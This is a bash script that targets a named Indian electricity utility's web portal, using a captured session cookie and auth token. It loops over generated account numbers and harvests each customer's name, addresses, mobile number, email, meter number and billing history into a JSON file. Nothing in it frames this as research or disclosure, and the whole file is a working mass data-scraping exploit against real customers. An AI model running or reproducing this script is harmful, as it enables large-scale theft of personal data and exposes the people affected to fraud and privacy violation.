#!/bin/bash

# Base URL and headers
URL="https://www.uhbvn.org.in/web/portal/delete-user?p_auth=3vSzVJbs&p_p_id=DeleteUser_WAR_Rapdrp&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view&p_p_col_id=column-1&p_p_col_count=1&_DeleteUser_WAR_Rapdrp_myaction=getAccountDetails"
COOKIE="JSESSIONID=WSSUHBVNSRV1!!lPw2s9BPzY0szIoDi6wqpwvm.undefined; GUEST_LANGUAGE_ID=en_US; COOKIE_SUPPORT=true"
REFERER="https://www.uhbvn.org.in/100"
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"

# Output JSON file
OUTPUT_FILE="consumer_data.json"
echo "[" > $OUTPUT_FILE

FIRST_ENTRY=true

# Function to handle account extraction and JSON formatting
process_account() {
  ACCOUNT_NO=$1
  
  # Execute cURL command and extract required HTML response
  RESPONSE=$(curl -s -X POST \
    -H "Cookie: $COOKIE" \
    -H "User-Agent: $USER_AGENT" \
    -H "Referer: $REFERER" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "accountNo=$ACCOUNT_NO&submit=SUBMIT" \
    "$URL")

  # Use pup to extract values from the HTML response
  ACCOUNT_NUMBER=$(echo "$RESPONSE" | pup 'td:contains("Account No.") + td text{}' | tr -d '\n')
  NAME=$(echo "$RESPONSE" | pup 'td:contains("Name") + td text{}' | tr -d '\n')
  BILLING_ADDRESS=$(echo "$RESPONSE" | pup 'td:contains("Billing Address") + td text{}' | tr -d '\n')
  PREMISE_ADDRESS=$(echo "$RESPONSE" | pup 'td:contains("Premise Address") + td text{}' | tr -d '\n')
  DISCOM_NAME=$(echo "$RESPONSE" | pup 'td:contains("Discom Name") + td text{}' | tr -d '\n')
  SUBDIVISION=$(echo "$RESPONSE" | pup 'td:contains("Sub-Division") + td text{}' | tr -d '\n')
  DIVISION=$(echo "$RESPONSE" | pup 'td:contains("Division") + td text{}' | tr -d '\n')
  CONSUMER_TYPE=$(echo "$RESPONSE" | pup 'td:contains("Consumer Type") + td text{}' | tr -d '\n')
  SECURITY_AMOUNT=$(echo "$RESPONSE" | pup 'td:contains("Security Amount (Rs.)") + td text{}' | tr -d '\n')
  SANCTIONED_LOAD=$(echo "$RESPONSE" | pup 'td:contains("Sanctioned Load") + td text{}' | tr -d '\n')
  METER_NUMBER=$(echo "$RESPONSE" | pup 'td:contains("Meter Number") + td text{}' | tr -d '\n')
  LEGACY_ACCOUNT=$(echo "$RESPONSE" | pup 'td:contains("Legacy Account") + td text{}' | tr -d '\n')
  MOBILE_NUMBER=$(echo "$RESPONSE" | pup 'td:contains("Mobile No.") + td text{}' | tr -d '\n')
  EMAIL_ADDRESS=$(echo "$RESPONSE" | pup 'td:contains("Email Address") + td text{}' | tr -d '\n')
  BILL_AMOUNT=$(echo "$RESPONSE" | pup 'td:contains("Bill Amount") + td text{}' | tr -d '\n')
  DUE_DATE=$(echo "$RESPONSE" | pup 'td:contains("Due Date") + td text{}' | tr -d '\n')
  BILL_DATE=$(echo "$RESPONSE" | pup 'td:contains("Bill Date") + td text{}' | tr -d '\n')
  LAST_PAID_AMOUNT=$(echo "$RESPONSE" | pup 'td:contains("Last Paid Amount") + td text{}' | tr -d '\n')
  LAST_PAYMENT_DATE=$(echo "$RESPONSE" | pup 'td:contains("Last Payment Date") + td text{}' | tr -d '\n')
  OUTSTANDING_AMOUNT=$(echo "$RESPONSE" | pup 'td:contains("Outstanding Amount") + td text{}' | tr -d '\n')

  # Check if essential fields are not empty
  if [ -n "$ACCOUNT_NUMBER" ] && [ -n "$NAME" ] && [ -n "$BILLING_ADDRESS" ] && [ -n "$DISCOM_NAME" ]; then
    # Format extracted data as JSON
    if [ ! "$FIRST_ENTRY" = true ]; then
      echo "," >> $OUTPUT_FILE
    fi
    FIRST_ENTRY=false

    echo "{
      \"ConsumerDetails\": {
        \"AccountNo\": \"$ACCOUNT_NUMBER\",
        \"Name\": \"$NAME\",
        \"BillingAddress\": \"$BILLING_ADDRESS\",
        \"PremiseAddress\": \"$PREMISE_ADDRESS\",
        \"DiscomName\": \"$DISCOM_NAME\",
        \"SubDivision\": \"$SUBDIVISION\",
        \"Division\": \"$DIVISION\",
        \"ConsumerType\": \"$CONSUMER_TYPE\",
        \"SecurityAmount\": \"$SECURITY_AMOUNT\",
        \"SanctionedLoad\": \"$SANCTIONED_LOAD\",
        \"MeterNumber\": \"$METER_NUMBER\",
        \"LegacyAccount\": \"$LEGACY_ACCOUNT\",
        \"MobileNumber\": \"$MOBILE_NUMBER\",
        \"EmailAddress\": \"$EMAIL_ADDRESS\"
      },
      \"BillDetails\": {
        \"BillAmount\": \"$BILL_AMOUNT\",
        \"DueDate\": \"$DUE_DATE\",
        \"BillDate\": \"$BILL_DATE\",
        \"LastPaidAmount\": \"$LAST_PAID_AMOUNT\",
        \"LastPaymentDate\": \"$LAST_PAYMENT_DATE\",
        \"OutstandingAmount\": \"$OUTSTANDING_AMOUNT\"
      }
    }" >> $OUTPUT_FILE
  else
    echo "No valid data for AccountNo: $ACCOUNT_NO, skipping."
  fi
}

export -f process_account
export COOKIE REFERER USER_AGENT URL OUTPUT_FILE FIRST_ENTRY

# Fixed part of the account number (last 7 digits)
FIXED_ACCOUNT_PART="8291000"

# Loop through the first three digits (100 to 999)
for FIRST_DIGIT in {1..9}; do
  for SECOND_DIGIT in {0..9}; do
    for THIRD_DIGIT in {0..9}; do
      # Construct the full account number by dynamically generating the first three digits
      ACCOUNT_NO="${FIRST_DIGIT}${SECOND_DIGIT}${THIRD_DIGIT}${FIXED_ACCOUNT_PART}"
      
      # Run in parallel using xargs
      echo $ACCOUNT_NO | xargs -n 1 -P 8 bash -c 'process_account "$@"' _
    done
  done
done

# Close JSON array
echo "]" >> $OUTPUT_FILE

echo "Data extraction complete. Output saved to $OUTPUT_FILE."

